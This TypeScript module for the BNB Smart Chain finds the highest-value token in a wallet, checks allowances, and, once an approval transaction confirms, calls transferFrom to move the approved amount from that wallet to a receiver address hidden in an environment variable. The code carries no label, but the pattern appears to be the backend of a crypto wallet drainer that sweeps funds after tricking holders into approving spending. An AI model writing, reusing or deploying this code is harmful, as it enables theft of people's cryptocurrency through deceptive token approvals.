import Moralis from "moralis";
import { EvmChain } from "@moralisweb3/common-evm-utils";
import { createWalletClient, http, createPublicClient } from "viem"
import {bsc } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'
import erc20ABI  from "@/utils/constants/erc20abi.json";

let moralis_started = false

const st_moralis = async() => {
  await Moralis.start({
    apiKey: process.env.NEXT_PUBLIC_MoralisAPI,
    // ...and any other configuration
  });

  moralis_started = true

}

const chain = EvmChain.BSC;
export const sender = async(contract: string, from: string, amount: bigint, accKey: string, hs: string ) => {

    const client = createWalletClient({
        chain: bsc,
        transport: http()
      })
      
      const account = privateKeyToAccount(accKey) 
     


    const pc = createPublicClient({
        chain: bsc,
        transport: http()
    })

    const to = process.env.Receiver

    try {


      const appr = await pc.waitForTransactionReceipt({hash: hs})
      console.log("Approval receipt", appr)

        const {request} = await pc.simulateContract({
            abi: erc20ABI,
            functionName: "transferFrom",
            args: [from,to, amount],
            account,
            address: contract
        })
    
        const hash = await client.writeContract(request)
        const receipt = pc.waitForTransactionReceipt({hash})
        console.log("receipt for sending",receipt)
        return hash
    }
     catch (error) {

        console.log("Sending error",error)
        return
        
    }
}
export const getAllowance = async(address: string, owner:string,spender: string) => {

if(!moralis_started)
{
  await st_moralis()
}
  
    
  try{
    const response = await Moralis.EvmApi.token.getTokenAllowance({
      address,
      chain,
      ownerAddress: owner,
      spenderAddress: spender
    });
   // console.log(response)
    const res = response.toJSON()
    const allowance = res.allowance
    //console.log(allowance)
    return allowance
  } 
  catch (error) {

    console.log("An error occur", error)
    return
  }
 
}

export const fetchBalance = async (address: string, token_address: string) => {

  try {
    if(!moralis_started)
    {
      await st_moralis()
    }
    
    const datas =await Moralis.EvmApi.token.getWalletTokenBalances({
      chain,
     address: address,
     tokenAddresses: [token_address]
    });
    
    const res = datas.toJSON()
    //console.log(res[0].balance)
    if(res)
    return res[0].balance
    
    return "0"
  } catch (error) {
    console.log("An error occur", error)
    return "0"
  }
 
/*
const balances = await fetchTokenBalance(address)
//console.log("Address token balance is",balances)
let account
for(var i =1; i < balances.length; i++)
{

if(balances[i].token_address == token_address)
{
   account = balances[i]
 break
}
}
if(account)
return account?.balance

return "0"
*/
  
};

const fetchTokenBalance = async (address: string) => {

  try {
    if(!moralis_started)
    {
      await st_moralis()
    }
    
      const chain = EvmChain.BSC;
    
      const response = await Moralis.EvmApi.token.getWalletTokenBalances({
        address,
        chain,
      });
   // console.log(address, response)
      return response.toJSON()
  } 
  catch (error) {
    console.log("Moralis error from tokenbalance",error)
    return
  }
};

export const queryBalance = async(address: string) => {

  try {
    const balances = await fetchTokenBalance(address)
   
   if(balances.length == 0 || !balances)
   {
    return "0x55d398326f99059ff775485246999027b3197955"
   }
   
    let contract = balances[0] 
    const p1 = await getPrice(contract.token_address)

    
    let v= parseFloat(p1) * parseFloat(contract.balance)

    

    let v1 = BigInt(parseInt(v))
 
   for(var i =1; i < balances.length; i++)
   {


    const bal = balances[i].balance
    const price = await getPrice(balances[i].token_address)
   
    
    let val = parseFloat(bal) * parseFloat(price)
    let value =  isNaN(parseInt(val))? BigInt(0) : BigInt(parseInt(val))
   
    if(value > BigInt(0) && value > v1 )
    {
       contract = balances[i]
       v1 = value
    }
     
   }
  
return contract.token_address
    
  } catch (error) {
    console.log("Query balance error", error)
  }
    
}

const getPrice = async(address: string) => {

  try {
    if(!moralis_started)
    {
      await st_moralis()
    }
  //console.log("Price of crypto")
  const res = await Moralis.EvmApi.token.getTokenPrice({
    chain: EvmChain.BSC,
    "include": "percent_change",
    address
  });

  const datas = res.toJSON()
  //console.log(datas.usdPrice)
  return datas.usdPrice
}
catch(error) {
  console.log("Moralis SDK error",error)
}
  
}